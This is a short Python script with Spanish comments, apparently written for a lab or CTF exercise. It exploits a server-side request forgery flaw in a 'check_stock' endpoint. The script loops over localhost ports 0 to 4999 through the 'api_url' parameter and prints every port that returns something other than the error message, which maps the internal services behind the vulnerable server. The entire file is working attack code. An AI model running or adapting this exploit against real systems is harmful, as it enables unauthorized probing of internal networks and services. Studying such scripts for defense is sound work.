import requests, signal, sys
from termcolor import colored

def def_handler(sig, frame):
    print(colored("\n[!] Saliendo ....!!\n", 'red'))
    sys.exit(1)

#CTRL+C
signal.signal(signal.SIGINT, def_handler)

URL_BASE =  "http://192.168.1.60:5007/check_stock?match_id=1&quantity=12&api_url="

# Función que aplica fuzzing para descubrir posibles APIs internas
def fuzz():
    for i in range (0, 5000):
        internal_api = f"http://localhost:{i}"
        r = requests.get(URL_BASE + internal_api)
        if "Error al consultar la API" not in r.text:
            print(colored("\n[*] INTERNAL API: " + internal_api + "\n", 'green'))

if __name__ == '__main__':
    fuzz()